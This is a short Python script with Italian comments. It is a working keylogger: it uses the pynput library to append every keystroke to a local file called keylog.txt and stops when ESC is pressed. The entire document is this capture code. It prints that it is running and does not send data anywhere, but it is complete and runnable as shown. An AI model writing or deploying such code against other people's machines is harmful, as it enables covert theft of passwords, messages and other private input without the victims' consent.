from pynput import keyboard
import os
import time

LOG_FILE = "keylog.txt"

def on_press(key):
    try:
        with open(LOG_FILE, "a") as f:
            if key == keyboard.Key.space:
                f.write(" ")  # fa lo Spazio
            elif key == keyboard.Key.enter:
                f.write("\n")  # va a capo
            elif key == keyboard.Key.backspace:
                f.write("[BACKSPACE]")  # segna lo spazio
            elif key == keyboard.Key.esc:
                print("\nKeylogger interrotto.")
                return False  # blocca il watcher
            else:
                f.write(key.char)  # lettera normale
    except AttributeError:
        with open(LOG_FILE, "a") as f:
            f.write(f" [{key}] ")  # Altro

def start_logger():
    print("Keylogger avviato. Premi 'ESC' per interrompere.")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    start_logger()
